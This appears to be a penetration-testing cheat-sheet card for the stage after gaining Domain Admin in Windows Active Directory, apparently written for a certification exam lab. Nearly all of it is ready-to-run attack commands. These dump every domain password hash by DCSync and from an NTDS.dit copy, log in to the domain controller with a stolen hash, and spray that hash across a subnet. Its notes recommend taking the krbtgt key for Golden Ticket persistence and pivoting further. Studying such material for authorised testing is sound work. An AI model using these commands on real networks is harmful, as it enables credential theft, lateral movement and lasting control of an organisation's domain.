---
id: domain-admin
title: Domain Admin / Proof
stage: objective
tags: [windows, ad]
tools:
  - impacket-secretsdump $DOMAIN/Administrator:password@$DC_IP
  - evil-winrm -i $DC_IP -u Administrator -H $NTLM
leads_to:
  - golden-ticket
  - pivot
---

## Confirm DA

```powershell
net group "Domain Admins" /domain
whoami /groups | findstr "Domain Admins"
whoami /all    # screenshot for exam submission
hostname
```

## Grab Proof

```bash
evil-winrm -i $DC_IP -u Administrator -H $NTLM
type C:\Users\Administrator\Desktop\proof.txt
```

## DCSync (dump all hashes — if not done already)

```bash
impacket-secretsdump $DOMAIN/Administrator:password@$DC_IP
impacket-secretsdump $DOMAIN/Administrator@$DC_IP -hashes :$NTLM
```

## NTDS.dit (full dump from shell on DC)

```powershell
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
```

```bash
impacket-secretsdump -ntds "C:\Temp\ntds\Active Directory\ntds.dit" -system C:\Temp\ntds\registry\SYSTEM LOCAL
```

## Spray Admin Hash Across All Hosts

```bash
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM
nxc smb 192.168.x.0/24 -u Administrator -H $NTLM --local-auth
```

## Notes

DA = game over for the domain. Immediately DCSync for all hashes, grab krbtgt for Golden Ticket persistence, check for additional subnets/forests to pivot into.
